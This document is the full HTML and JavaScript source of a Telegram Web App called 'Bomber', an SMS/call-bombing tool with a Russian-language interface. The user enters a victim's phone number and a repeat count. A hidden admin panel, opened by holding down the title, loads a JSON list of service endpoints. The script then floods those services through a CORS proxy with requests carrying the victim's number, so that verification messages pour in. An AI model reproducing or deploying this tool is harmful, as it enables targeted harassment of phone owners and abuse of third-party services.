<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes,viewport-fit=cover">
    <title>Bomber ¬∑ CRUX Edition</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --accent: #b0b0ff; 
            --bg-glow: radial-gradient(circle at 30% 20%, #1e1e2f, #0a0c14);
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent !important;
            touch-action: manipulation;
        }

        body {
            background: var(--bg-glow);
            color: #eaeaff;
            font-family: 'Inter', -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            position: relative;
            user-select: none;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }

        #bg-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; 
            pointer-events: none; will-change: transform; transform: translateZ(0);
        }

        .card { 
            width: 100%; max-width: 320px; text-align: center; position: relative; z-index: 10;
            animation: entry-fade 1.2s ease-out;
        }

        @keyframes entry-fade {
            0% { opacity: 0; transform: scale(0.95); }
            100% { opacity: 1; transform: scale(1); }
        }

        .header { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; gap: 4px; }
        .title { 
            font-size: 2.2rem; font-weight: 700; color: #f0f0ff; 
            text-shadow: 0 0 10px var(--accent); line-height: 1;
            cursor: pointer;
        }
        
        .bomb-emoji { font-size: 2.2rem; cursor: pointer; transition: transform 0.3s; display: inline-block; }
        .bomb-emoji.active-anim { animation: moon-charge 0.7s ease-in-out; }
        @keyframes moon-charge {
            0% { transform: scale(1); }
            50% { transform: scale(1.3); filter: brightness(1.5); }
            100% { transform: scale(1); }
        }

        .phone-field {
            display: flex; align-items: center; background: rgba(18, 18, 30, 0.8);
            border: 1px solid #5f5f8f; border-radius: 14px; backdrop-filter: blur(8px);
            width: 185px; padding: 2px; transition: 0.3s;
        }
        
        .phone-field.invalid { border-color: #ff4444; animation: shake 0.4s; }
        @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-4px);} 75% {transform: translateX(4px);} }

        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; position: relative; }
        .code-dropdown {
            position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); 
            border: 2px solid var(--accent); border-radius: 14px; display: none; z-index: 1000; min-width: 120px;
        }
        .code-selector.active .code-dropdown { display: block; }
        .code-item { padding: 10px; font-size: 0.75rem; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }

        .phone-number-input { background: transparent; border: none; color: #fff; font-size: 0.8rem; padding: 5px; outline: none; width: 100%; }

        .row { display: flex; justify-content: center; align-items: stretch; gap: 6px; margin-bottom: 1.5rem; }

        .repeats {
            display: flex; align-items: center; gap: 3px; background: rgba(20, 20, 35, 0.7);
            border: 1px solid #5f5f8f; border-radius: 12px; padding: 0 8px;
        }
        .repeats-input { width: 30px; background: transparent; border: none; color: #fff; text-align: center; outline: none; font-weight: 700; font-size: 0.8rem; }
        .repeats-max { font-size: 0.6rem; color: #fff; background: rgba(180,180,255,0.1); padding: 3px 6px; border-radius: 6px; }

        .attack-btn {
            width: 210px; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent);
            border-radius: 100px; color: #fff; padding: 12px; cursor: pointer; font-weight: 700; 
            text-transform: uppercase; letter-spacing: 2px; transition: 0.2s;
        }
        .attack-btn:active { transform: scale(0.96); }

        #adminPanel {
            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.95);
            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9000; padding: 20px;
        }
        #jsonInput { width: 100%; height: 200px; background: #000; color: #0f0; font-family: monospace; font-size: 0.7rem; border: 1px solid var(--accent); padding: 10px; border-radius: 10px; }

        .loading-overlay {
            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.9);
            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 5000;
        }
        .loading-overlay.show { display: flex; }
        .progress-bg { width: 220px; height: 4px; background: rgba(255,255,255,0.05); border-radius: 10px; margin-top: 15px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: var(--accent); transition: width 0.3s; }
    </style>
</head>
<body>

<canvas id="bg-canvas"></canvas>

<div class="card">
    <div class="header">
        <span class="title" id="mainTitle">Bomber</span>
        <span class="bomb-emoji" id="bombLogo">üí£</span>
    </div>
    
    <div class="row">
        <div class="phone-field" id="phoneBox">
            <div class="code-selector" id="codeSelector">
                <span id="selectedCode">üá∑üá∫ +7</span>
                <div class="code-dropdown" id="codeDropdown">
                    <div class="code-item" data-code="+7">üá∑üá∫ +7</div>
                    <div class="code-item" data-code="+380">üá∫üá¶ +380</div>
                    <div class="code-item" data-code="+375">üáßüáæ +375</div>
                    <div class="code-item" data-code="+7">üá∞üáø +7</div>
                </div>
            </div>
            <input class="phone-number-input" type="text" id="localNumber" placeholder="900 000 00 00" inputmode="numeric">
        </div>
        
        <div class="row" style="margin-bottom:0">
            <div class="repeats">
                <input class="repeats-input" type="number" id="repeat" value="1" min="1" max="100">
                <span class="repeats-max">
                    <span id="servicesCounter">0</span>
                </span>
            </div>
        </div>
    </div>
    
    <button class="attack-btn" id="go">–ù–ê–ß–ê–¢–¨ –ê–¢–ê–ö–£</button>
</div>

<div id="adminPanel">
    <h3 style="margin-bottom:10px">–í—Å—Ç–∞–≤—å JSON —Å—é–¥–∞:</h3>
    <textarea id="jsonInput" placeholder='[{"url": "...", "method": "POST"}]'></textarea>
    <button class="attack-btn" id="saveJson" style="margin-top:15px; width:100%">–°–û–•–†–ê–ù–ò–¢–¨</button>
    <button id="closeAdmin" style="margin-top:10px; color:#aaa; background:none; border:none;">–ó–∞–∫—Ä—ã—Ç—å</button>
</div>

<div class="loading-overlay" id="loadingOverlay">
    <div id="statusTxt" style="color:var(--accent); font-family:monospace;">–ê—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞...</div>
    <div class="progress-bg"><div class="progress-fill" id="progressFill"></div></div>
    <button id="stopAttack" style="margin-top:20px; color:#ff4444; background:none; border:1px solid #ff4444; padding:5px 15px; border-radius:20px;">–°–¢–û–ü</button>
</div>

<script>
    (function() {
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();

        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
        let particles = [], loadedServices = [], isAttacking = false;
        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';

        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        window.addEventListener('resize', resize); resize();

        class P {
            constructor() { this.x = Math.random()*canvas.width; this.y = Math.random()*canvas.height; this.v = 0.4; }
            update() { this.y -= this.v; if(this.y<0) this.y=canvas.height; }
            draw() { ctx.fillStyle = "#b0b0ff"; ctx.globalAlpha = 0.2; ctx.fillRect(this.x, this.y, 1.2, 1.2); }
        }
        for(let i=0; i<50; i++) particles.push(new P());

        function anim() {
            ctx.fillStyle = "#0a0c14"; ctx.globalAlpha = 1; ctx.fillRect(0,0,canvas.width,canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            requestAnimationFrame(anim);
        }
        anim();

        const loadSaved = () => {
            const data = localStorage.getItem('bomber_services');
            if(data) {
                try {
                    loadedServices = JSON.parse(data);
                    document.getElementById('servicesCounter').innerText = loadedServices.length;
                } catch(e) { loadedServices = []; }
            }
        };
        loadSaved();

        let timer;
        const title = document.getElementById('mainTitle');
        title.onmousedown = title.ontouchstart = () => {
            timer = setTimeout(() => {
                document.getElementById('adminPanel').style.display = 'flex';
                tg.HapticFeedback.notificationOccurred('success');
            }, 2000);
        };
        title.onmouseup = title.ontouchend = () => clearTimeout(timer);

        document.getElementById('saveJson').onclick = () => {
            const val = document.getElementById('jsonInput').value;
            try {
                const parsed = JSON.parse(val);
                localStorage.setItem('bomber_services', JSON.stringify(parsed));
                loadSaved();
                document.getElementById('adminPanel').style.display = 'none';
                tg.showAlert("–£—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω–æ " + parsed.length + " —Å–µ—Ä–≤–∏—Å–æ–≤!");
            } catch(e) { tg.showAlert("–û—à–∏–±–∫–∞ –≤ JSON!"); }
        };

        document.getElementById('closeAdmin').onclick = () => document.getElementById('adminPanel').style.display = 'none';

        async function sendReq(s, phone) {
            const url = proxyUrl + s.url.replace('%phone%', phone);
            const options = {
                method: s.method || 'POST',
                headers: { ...(s.headers || {}), 'X-Requested-With': 'XMLHttpRequest' }
            };
            if(s.body) {
                options.body = typeof s.body === 'string' ? s.body.replace('%phone%', phone) : JSON.stringify(s.body).replace('%phone%', phone);
            }
            try { await fetch(url, options); } catch(e) {}
        }

        document.getElementById('go').onclick = async () => {
            if(loadedServices.length === 0) {
                tg.showAlert("–°–Ω–∞—á–∞–ª–∞ –∑–∞–≥—Ä—É–∑–∏ JSON (–∑–∞–∂–º–∏ Bomber)");
                return;
            }
            const phoneStr = document.getElementById('localNumber').value.replace(/\D/g,'');
            if(phoneStr.length < 7) {
                document.getElementById('phoneBox').classList.add('invalid');
                setTimeout(()=>document.getElementById('phoneBox').classList.remove('invalid'), 400);
                return;
            }
            
            const reps = parseInt(document.getElementById('repeat').value) || 1;
            const fullPhone = document.getElementById('selectedCode').innerText.replace(/\D/g,'') + phoneStr;
            
            isAttacking = true;
            document.getElementById('loadingOverlay').classList.add('show');
            tg.HapticFeedback.impactOccurred('medium');

            const total = loadedServices.length * reps;
            let count = 0;

            for(let i=0; i<reps && isAttacking; i++) {
                for(const s of loadedServices) {
                    if(!isAttacking) break;
                    await sendReq(s, fullPhone);
                    count++;
                    document.getElementById('progressFill').style.width = (count/total*100) + '%';
                    document.getElementById('statusTxt').innerText = `–ê—Ç–∞–∫–∞: ${count}/${total}`;
                    await new Promise(r => setTimeout(r, 200));
                }
            }
            isAttacking = false;
            document.getElementById('loadingOverlay').classList.remove('show');
        };

        document.getElementById('codeSelector').onclick = (e) => {
            e.stopPropagation();
            document.getElementById('codeSelector').classList.toggle('active');
        };

        document.querySelectorAll('.code-item').forEach(i => {
            i.onclick = () => document.getElementById('selectedCode').innerText = i.dataset.code;
        });

        document.getElementById('stopAttack').onclick = () => isAttacking = false;
    })();
</script>
</body>
</html>
